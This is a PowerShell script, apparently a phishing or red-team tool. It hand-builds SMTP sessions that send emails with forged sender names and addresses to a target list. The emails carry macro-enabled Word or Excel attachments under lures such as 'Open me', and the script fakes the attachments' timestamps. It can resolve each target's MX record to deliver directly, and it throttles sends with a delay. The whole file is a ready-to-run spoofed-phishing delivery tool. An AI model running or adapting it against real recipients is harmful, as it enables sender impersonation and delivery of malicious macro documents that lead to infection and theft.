#### Script Params - Change these
$targetEmailAddresses = ForEach($i in 0..1){"simongurney@example.com"}
[System.Collections.ArrayList]$emails = (
@{
"fromAddress" = "trustedperson@example.com"
"fromName" = "A trusted source"
"subject" = "Open me"
"filePath" = "C:\MacroEmails\MacroEmbedded.xls"
"emailBody" = "Hi,

This is a basic email example
	
Thanks,
	
Me"
},
@{
"fromAddress" = ""
"fromName" = ""
"subject" = ""
"filePath" = ""
"emailBody" = ""
},
@{
"fromAddress" = ""
"fromName" = ""
"subject" = ""
"filePath" = ""
"emailBody" = ""
},
@{
"fromAddress" = "trustedperson@example.com"
"fromName" = "A trusted source"
"subject" = "Open me"
"filePath" = "C:\MacroEmails\MacroEmbedded.doc"
"emailBody" = "<html>
Hi,
<br><br>
An example HTML email
</html>
"
},
@{
"fromAddress" = ""
"fromName" = ""
"subject" = ""
"filePath" = ""
"emailBody" = ""
},
@{
"fromAddress" = ""
"fromName" = ""
"subject" = ""
"filePath" = ""
"emailBody" = ""
}
)

### Script definitions - No need to change any of these but can if you need.  beware things may break
$delayInSeconds = 30
$messageIDCharacters = "1","2","3","4","5","6","7","8","9","A","B","C","D","E","F"
$overideSmtpServerIPAddress = "172.16.200.1"   ## Comment this out to send direct to the email targets smtp server
$messageIDSuffix = "@OBSCURED.local"
$uBoundaryString = "uBoundaryString"
$ErrorActionPreference = "Stop"
$fileTypes = @{
"doc" = "msword"
"docm" = "application/vnd.ms-word.document.macroEnabled.12"
"xls" = "application/vnd.ms-excel"
"xlsm" = "application/vnd.ms-excel.sheet.macroEnabled.12"
"ppt" = "application/vnd.ms-powerpoint"
"pptm" = "application/vnd.ms-powerpoint.presentation.macroEnabled.12"
}

### Script Functions - Don't change anything below this comment
function CreateFileHashTable ($filePath)
{
    try
        {
        $file = Get-ChildItem -Path $filePath
        $fileName = $file.BaseName
        [string]$fileExtension = $file.Extension.Trim(".")
        $fileSize = $file.Length
        }
    catch
        {
        throw "Can't find file - $filePath"
        }
    try
        {
        $fileBase64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($filePath))
        }
    catch
        {
        throw "File exists but can't read, is it open? - $filePath"
        }
    $fileContentType = $fileTypes.($fileExtension)
    if (! $fileContentType) {throw "Not a supported content type - $filePath"}
    $returnInfo = @{
        "attachmentName" = $fileName;
        "attachmentExtension" = $fileExtension;
        "attachmentContentType" = $fileContentType;
        "attachmentBase64" = $fileBase64;
        "attachmentSize" = $fileSize
        }
    return $returnInfo
}

function SendMail ($data, $serverIP)
{
try
    {
    $emailServer = New-Object System.Net.Sockets.TcpClient $serverIP, 25
    $connectionSocket = $emailServer.GetStream()
    $connectionTunnelInput = New-Object System.IO.StreamWriter $connectionSocket
    $connectionTunnelInput.Write($data)
    sleep -Seconds 10 ### Give it chance to transmit
    $connectionTunnelInput.Dispose()
    $connectionSocket.Dispose()
    $emailServer.Dispose()
    }
catch
    {
    echo "Error sending email to $serverIP, are you using a dynamic IP?"
    }
}

function GetMXRecord ($emailAddress)
{
    try
        {
        $mxRecord = Resolve-DnsName -Type MX -Name $emailAddress.Split("@")[1] | ? Type -eq "MX"
        }
    catch
        {
        echo "Cant get DNS record for $emailAddress"; return
        }
    
    if ($mxRecord -eq $null) { echo "No MX records for this email address : $emailAddress"; return }
    if ($mxRecord -is [system.array]) { $mxRecord = $mxRecord[0] }
    
    try
        {
        $smtpServerIPAddress = Resolve-DnsName -Name $mxRecord.NameExchange -Type A        
        }
    catch
        {
        echo "Cant get DNS record for $mxRecord"; return
        }
    if ($smtpServerIPAddress -eq $null) { echo "No A records for this MX record : $mxRecord"; return }
    if ($smtpServerIPAddress -is [system.array]) { $smtpServerIPAddress = get-random -inputObject $smtpServerIPAddress }
    return $smtpServerIPAddress.IPAddress
}

# Parameter validation
ForEach ($i in 0..($emails.Count - 1))
{
if ($emails[$i].keys.Count -ne 5) {throw "Not enough keys in the email hash table at position $i"}
if ($emails[$i].values.Count -ne 5) {throw "Not enough values in the email hash table at position $i"}

ForEach ($key in ($emails[$i].keys))
    {
    if ($emails[$i][$key] -eq "" -or $emails[$i][$key] -eq $null)
        {
        echo "Empty value detected in email $i :: key $key - so removing email from array"
        $ErrorActionPreference = "SilentlyContinue"
        $emails[$i].Add("Remove", $true)
        $ErrorActionPreference = "Stop"
        break
        }
    }
}

$tempHoldingArray = $emails.Clone() ### Need this as we are otherwise modifying what we are iterating through
ForEach ($email in $tempHoldingArray){
if ($email["Remove"] -eq $true){$emails.Remove($email)}
}

#Values generated once per execution
[string]$uniqueID = foreach($i in 1..40){Get-Random -InputObject $messageIDCharacters}
$uniqueID = $uniqueID.Replace(' ','')
$messageID = $uniqueID + $messageIDSuffix
$boundaryString = $uniqueID + $uBoundaryString + "_"

#### Generate extra attributes for the different source emails available
ForEach ($i in 0..(($emails.Count) - 1))
{
$emails[$i] += (CreateFileHashTable $emails[$i].filePath)
$emails[$i].Add("bodyBase64", [Convert]::ToBase64String([System.Text.Encoding]::Utf8.GetBytes($emails[$i].emailBody)))
if ($emails[$i].emailBody.Contains("<html>")){$emails[$i].Add("bodyContentType","html")} else {$emails[$i].Add("bodyContentType","plain")}
}


ForEach ($target in $targetEmailAddresses)
{
#Assemble all the values we need for the email.
$dateStamp = get-date -Format "ddd, dd mmm yyyy HH:mm:ss +0000"
$spoofedFileCreationTimeStamp = ((get-date).Addhours(-3) | get-date -Format "ddd, dd mmm yyyy HH:mm:ss ") + "GMT"
$spoofedFileModifiedTimeStamp = ((get-date).Addhours(-2) | get-date -Format "ddd, dd mmm yyyy HH:mm:ss ") + "GMT"
$emailArrayIndex  = if ($emails.Count -gt 1) {Get-Random -Minimum 0 -Maximum ($emails.Count)} else { 0 }
$toEmailAddress = $target
$toEmailName = $target.split(".")[0]
$email = $emails[$emailArrayIndex]
$subject = $email.subject
$emailContentType = $email.bodyContentType
$emailContentBase64 = $email.bodyBase64 
$emailAttachmentContentType = $email.attachmentContentType
$emailAttachmentBase64 = $email.attachmentBase64
$emailAttachmentName = $email.attachmentName + "." + $email.attachmentExtension
$emailAttachmentFileSize = $email.attachmentSize
$fromEmailAddress = $email.fromAddress
$fromEmailName = $email.fromName
$fromMailServer = $email.fromAddress.Split("@")[1]
if ($overideSmtpServerIPAddress) {$smtpServer = $overideSmtpServerIPAddress}
if (!$smtpServer) { $smtpServer = GetMXRecord $target }
if ($smtpServer -notmatch "\d+?\.\d+?\.\d+?\.\d+?") {echo "Skipping $toEmailAddress as no SMTP server identified"; continue }


### Combine the smtp chunks into a data stream
[string]$smtpCommands = "EHLO mailserver.$fromMailServer
MAIL FROM: <$fromEmailAddress>
RCPT TO: <$toEmailAddress>
"
$smtpData = "DATA
From: $fromEmailName <$fromEmailAddress>
To: $toEmailName <$toEmailAddress>
Subject: $subject
Date: $dateStamp
Message-ID: <$messageID>
Accept-Language: en-GB, en-US
Content-Language: en-US
X-MS-Has-Attach: yes
Content-Type: multipart/mixed;
    boundary=`"_001_$boundaryString`"
MIME-Version: 1.0

--_001_$boundaryString
Content-Type: text/$emailContentType; charset=`"utf-8`"
Content-Transfer-Encoding: base64

$emailContentBase64

--_001_$boundaryString
Content-Type: $emailAttachmentContentType; name=`"$emailAttachmentName`"
Content-Description: $emailAttachmentName
Content-Disposition: attachment; filename=`"$emailAttachmentName`"; size=$emailAttachmentFileSize;
        creation-date=`"$spoofedFileCreationTimeStamp`";
        modification-date=`"$spoofedFileModifiedTimeStamp`"
Content-Transfer-Encoding: base64

$emailAttachmentBase64

--_001_$boundaryString--

.
"
$smtpClose = "QUIT
"

#### Send the email
$dataForTransmission = $smtpCommands + $smtpData + $smtpClose
SendMail $dataForTransmission $smtpServer
sleep -Seconds $delayInSeconds
}